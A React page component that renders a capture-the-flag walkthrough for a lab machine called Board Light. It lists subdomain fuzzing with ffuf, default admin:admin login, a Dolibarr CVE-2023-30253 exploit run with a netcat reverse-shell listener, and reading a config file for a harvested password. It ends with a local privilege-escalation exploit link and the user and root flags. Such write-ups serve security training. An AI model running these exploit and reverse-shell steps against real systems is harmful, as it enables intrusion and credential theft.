import { Link } from 'react-router-dom';
import board_light_1 from '../../../assets/board_light_1.png';
import board_light_2 from '../../../assets/board_light_2.png';
import board_light_3 from '../../../assets/board_light_3.png';
import board_light_4 from '../../../assets/board_light_4.png';
import board_light_5 from '../../../assets/board_light_5.png';
import board_light_6 from '../../../assets/board_light_6.png';
import board_light_7 from '../../../assets/board_light_7.png';
import board_light_8 from '../../../assets/board_light_8.png';
import board_light_9 from '../../../assets/board_light_9.png';
import board_light_10 from '../../../assets/board_light_10.png';

import ExampleFrame from '../../exampleFrame/ExampleFrame';

const BoardLight = () =>{
    return(
        <section>
            <h1>Board Light</h1>
            <div className="waring">
                <p>sudo echo "10.10.11.11 board.htb" | sudo tee -a /etc/hosts</p>
            </div>

            <ExampleFrame screen={board_light_10} />

            <div className='waring'>
                <p>ffuf -w /root/Downloads/SecLists/Discovery/DNS/bitquark-subdomains-top100000.txt -u http://10.10.11.11 -H 'Host: FUZZ.board.htb' -fs 15949</p>
            </div>
            <ExampleFrame screen={board_light_1} />

            <div className="waring">
                <p>sudo echo "10.10.11.11 board.htb" | sudo tee -a /etc/hosts</p>
            </div>            

            <ExampleFrame screen={board_light_2} />
            <p className='important'>admin:admin</p>

            <Link to='https://github.com/nikn0laty/Exploit-for-Dolibarr-17.0.0-CVE-2023-30253'>Exploit</Link>

            <div className='waring'>
                <p>nc -lnvp 1010</p>
            </div>

            <div className='waring'>
                <p>python3 exploit.py http://crm.board.htb admin admin <span>{`<OUR IP>`}</span> <span>{`<LISTENING PORT (nc)>`}</span></p>
            </div>

            <ExampleFrame screen={board_light_3} />
            <ExampleFrame screen={board_light_4} />

            <hr />

            <div className='waring'>
                <p>cat /var/www/html/crm.board.htb/htdocs/conf/conf.php</p>
            </div>
        
            <ExampleFrame screen={board_light_5} />
            <ExampleFrame screen={board_light_6} />

            <p className='important'>larissa:{`serverfun2$2023!!`}</p>
            <ExampleFrame screen={board_light_7} />
            <div className='waring'>
                <p>cat ./user.txt</p>
                <span className='important flag'>ffb58e5d4602d8c5f94cf6313f85dba0</span>
            </div>
            <ExampleFrame screen={board_light_8} />
            <hr />
            <Link to='https://github.com/MaherAzzouzi/CVE-2022-37706-LPE-exploit'>Exploit</Link>
            <ExampleFrame screen={board_light_9} />
            <div className='waring'>
                <span className='important flag'>2a7a3141832d9f498ef5c95dcc759e06</span>
            </div>
        </section>
    )
}

export default BoardLight;